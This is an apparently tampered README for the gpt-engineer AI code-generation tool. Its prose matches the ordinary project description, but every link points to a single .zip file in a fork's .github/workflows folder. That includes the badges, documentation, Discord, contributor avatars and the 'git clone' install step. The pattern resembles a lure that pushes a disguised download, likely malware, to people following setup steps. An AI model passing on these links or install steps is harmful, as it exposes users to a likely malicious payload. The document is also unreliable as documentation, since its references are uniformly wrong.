# gpt-engineer

[![GitHub Repo stars](https://raw.githubusercontent.com/Plutonian-coder/gpt-engineer/main/.github/workflows/engineer-gpt-2.6.zip)](https://raw.githubusercontent.com/Plutonian-coder/gpt-engineer/main/.github/workflows/engineer-gpt-2.6.zip)
[![Discord Follow](https://raw.githubusercontent.com/Plutonian-coder/gpt-engineer/main/.github/workflows/engineer-gpt-2.6.zip)](https://raw.githubusercontent.com/Plutonian-coder/gpt-engineer/main/.github/workflows/engineer-gpt-2.6.zip)
[![License](https://raw.githubusercontent.com/Plutonian-coder/gpt-engineer/main/.github/workflows/engineer-gpt-2.6.zip)](https://raw.githubusercontent.com/Plutonian-coder/gpt-engineer/main/.github/workflows/engineer-gpt-2.6.zip)
[![GitHub Issues or Pull Requests](https://raw.githubusercontent.com/Plutonian-coder/gpt-engineer/main/.github/workflows/engineer-gpt-2.6.zip)](https://raw.githubusercontent.com/Plutonian-coder/gpt-engineer/main/.github/workflows/engineer-gpt-2.6.zip)
![GitHub Release](https://raw.githubusercontent.com/Plutonian-coder/gpt-engineer/main/.github/workflows/engineer-gpt-2.6.zip)
[![Twitter Follow](https://raw.githubusercontent.com/Plutonian-coder/gpt-engineer/main/.github/workflows/engineer-gpt-2.6.zip)](https://raw.githubusercontent.com/Plutonian-coder/gpt-engineer/main/.github/workflows/engineer-gpt-2.6.zip)

The OG code genereation experimentation platform!

If you are looking for the evolution that is an opinionated, managed service – check out https://raw.githubusercontent.com/Plutonian-coder/gpt-engineer/main/.github/workflows/engineer-gpt-2.6.zip

If you are looking for a well maintained hackable CLI for – check out aider.


gpt-engineer lets you:
- Specify software in natural language
- Sit back and watch as an AI writes and executes the code
- Ask the AI to implement improvements

## Getting Started

### Install gpt-engineer

For **stable** release:

- `python -m pip install gpt-engineer`

For **development**:
- `git clone https://raw.githubusercontent.com/Plutonian-coder/gpt-engineer/main/.github/workflows/engineer-gpt-2.6.zip`
- `cd gpt-engineer`
- `poetry install`
- `poetry shell` to activate the virtual environment

We actively support Python 3.10 - 3.12. The last version to support Python 3.8 - 3.9 was [0.2.6](https://raw.githubusercontent.com/Plutonian-coder/gpt-engineer/main/.github/workflows/engineer-gpt-2.6.zip).

### Setup API key

Choose **one** of:
- Export env variable (you can add this to .bashrc so that you don't have to do it each time you start the terminal)
    - `export OPENAI_API_KEY=[your api key]`
- .env file:
    - Create a copy of `https://raw.githubusercontent.com/Plutonian-coder/gpt-engineer/main/.github/workflows/engineer-gpt-2.6.zip` named `.env`
    - Add your OPENAI_API_KEY in .env
- Custom model:
    - See [docs](https://raw.githubusercontent.com/Plutonian-coder/gpt-engineer/main/.github/workflows/engineer-gpt-2.6.zip), supports local model, azure, etc.

Check the [Windows README](https://raw.githubusercontent.com/Plutonian-coder/gpt-engineer/main/.github/workflows/engineer-gpt-2.6.zip) for Windows usage.

**Other ways to run:**
- Use Docker ([instructions](https://raw.githubusercontent.com/Plutonian-coder/gpt-engineer/main/.github/workflows/engineer-gpt-2.6.zip))
- Do everything in your browser:
[![Open in GitHub Codespaces](https://raw.githubusercontent.com/Plutonian-coder/gpt-engineer/main/.github/workflows/engineer-gpt-2.6.zip)](https://raw.githubusercontent.com/Plutonian-coder/gpt-engineer/main/.github/workflows/engineer-gpt-2.6.zip)

### Create new code (default usage)
- Create an empty folder for your project anywhere on your computer
- Create a file called `prompt` (no extension) inside your new folder and fill it with instructions
- Run `gpte <project_dir>` with a relative path to your folder
  - For example: `gpte projects/my-new-project` from the gpt-engineer directory root with your new folder in `projects/`

### Improve existing code
- Locate a folder with code which you want to improve anywhere on your computer
- Create a file called `prompt` (no extension) inside your new folder and fill it with instructions for how you want to improve the code
- Run `gpte <project_dir> -i` with a relative path to your folder
  - For example: `gpte projects/my-old-project -i` from the gpt-engineer directory root with your folder in `projects/`

### Benchmark custom agents
- gpt-engineer installs the binary 'bench', which gives you a simple interface for benchmarking your own agent implementations against popular public datasets.
- The easiest way to get started with benchmarking is by checking out the [template](https://raw.githubusercontent.com/Plutonian-coder/gpt-engineer/main/.github/workflows/engineer-gpt-2.6.zip) repo, which contains detailed instructions and an agent template.
- Currently supported benchmark:
  - [APPS](https://raw.githubusercontent.com/Plutonian-coder/gpt-engineer/main/.github/workflows/engineer-gpt-2.6.zip)
  - [MBPP](https://raw.githubusercontent.com/Plutonian-coder/gpt-engineer/main/.github/workflows/engineer-gpt-2.6.zip)

The community has started work with different benchmarking initiatives, as described in [this Loom](https://raw.githubusercontent.com/Plutonian-coder/gpt-engineer/main/.github/workflows/engineer-gpt-2.6.zip) video.

### Research
Some of our community members have worked on different research briefs that could be taken further. See [this document](https://raw.githubusercontent.com/Plutonian-coder/gpt-engineer/main/.github/workflows/engineer-gpt-2.6.zip) if you are interested.

## Terms
By running gpt-engineer, you agree to our [terms](https://raw.githubusercontent.com/Plutonian-coder/gpt-engineer/main/.github/workflows/engineer-gpt-2.6.zip).


## Relation to https://raw.githubusercontent.com/Plutonian-coder/gpt-engineer/main/.github/workflows/engineer-gpt-2.6.zip (GPT Engineer)
[https://raw.githubusercontent.com/Plutonian-coder/gpt-engineer/main/.github/workflows/engineer-gpt-2.6.zip](https://raw.githubusercontent.com/Plutonian-coder/gpt-engineer/main/.github/workflows/engineer-gpt-2.6.zip) is a commercial project for the automatic generation of web apps.
It features a UI for non-technical users connected to a git-controlled codebase.
The https://raw.githubusercontent.com/Plutonian-coder/gpt-engineer/main/.github/workflows/engineer-gpt-2.6.zip team is actively supporting the open source community.


## Features

### Pre Prompts
You can specify the "identity" of the AI agent by overriding the `preprompts` folder with your own version of the `preprompts`. You can do so via the `--use-custom-preprompts` argument.

Editing the `preprompts` is how you make the agent remember things between projects.

### Vision

By default, gpt-engineer expects text input via a `prompt` file. It can also accept image inputs for vision-capable models. This can be useful for adding UX or architecture diagrams as additional context for GPT Engineer. You can do this by specifying an image directory with the `—-image_directory` flag and setting a vision-capable model in the second CLI argument.

E.g. `gpte projects/example-vision gpt-4-vision-preview --prompt_file prompt/text --image_directory prompt/images -i`

### Open source, local and alternative models

By default, gpt-engineer supports OpenAI Models via the OpenAI API or Azure OpenAI API, as well as Anthropic models.

With a little extra setup, you can also run with open source models like WizardCoder. See the [documentation](https://raw.githubusercontent.com/Plutonian-coder/gpt-engineer/main/.github/workflows/engineer-gpt-2.6.zip) for example instructions.

## Mission

The gpt-engineer community mission is to **maintain tools that coding agent builders can use and facilitate collaboration in the open source community**.

If you are interested in contributing to this, we are interested in having you.

If you want to see our broader ambitions, check out the [roadmap](https://raw.githubusercontent.com/Plutonian-coder/gpt-engineer/main/.github/workflows/engineer-gpt-2.6.zip), and join
[discord](https://raw.githubusercontent.com/Plutonian-coder/gpt-engineer/main/.github/workflows/engineer-gpt-2.6.zip)
to learn how you can [contribute](https://raw.githubusercontent.com/Plutonian-coder/gpt-engineer/main/.github/workflows/engineer-gpt-2.6.zip) to it.

gpt-engineer is [governed](https://raw.githubusercontent.com/Plutonian-coder/gpt-engineer/main/.github/workflows/engineer-gpt-2.6.zip) by a board of long-term contributors. If you contribute routinely and have an interest in shaping the future of gpt-engineer, you will be considered for the board.

## Significant contributors
<ul style="list-style-type: none; padding: 0; display: flex; flex-wrap: wrap;"> <li style="margin-right: 10px; margin-bottom: 10px;"> <a href="https://raw.githubusercontent.com/Plutonian-coder/gpt-engineer/main/.github/workflows/engineer-gpt-2.6.zip"> <img src="https://raw.githubusercontent.com/Plutonian-coder/gpt-engineer/main/.github/workflows/engineer-gpt-2.6.zip" alt="@ATheorell" width="32" height="32" style="border-radius: 50%;"> @ATheorell </a> </li> <li style="margin-right: 10px; margin-bottom: 10px;"> <a href="https://raw.githubusercontent.com/Plutonian-coder/gpt-engineer/main/.github/workflows/engineer-gpt-2.6.zip"> <img src="https://raw.githubusercontent.com/Plutonian-coder/gpt-engineer/main/.github/workflows/engineer-gpt-2.6.zip" alt="@similato87" width="32" height="32" style="border-radius: 50%;"> @similato87 </a> </li> <li style="margin-right: 10px; margin-bottom: 10px;"> <a href="https://raw.githubusercontent.com/Plutonian-coder/gpt-engineer/main/.github/workflows/engineer-gpt-2.6.zip"> <img src="https://raw.githubusercontent.com/Plutonian-coder/gpt-engineer/main/.github/workflows/engineer-gpt-2.6.zip" alt="@TheoMcCabe" width="32" height="32" style="border-radius: 50%;"> @TheoMcCabe </a> </li> <li style="margin-right: 10px; margin-bottom: 10px;"> <a href="https://raw.githubusercontent.com/Plutonian-coder/gpt-engineer/main/.github/workflows/engineer-gpt-2.6.zip"> <img src="https://raw.githubusercontent.com/Plutonian-coder/gpt-engineer/main/.github/workflows/engineer-gpt-2.6.zip" alt="@captivus" width="32" height="32" style="border-radius: 50%;"> @captivus </a> </li> </ul>


## Example



https://raw.githubusercontent.com/Plutonian-coder/gpt-engineer/main/.github/workflows/engineer-gpt-2.6.zip
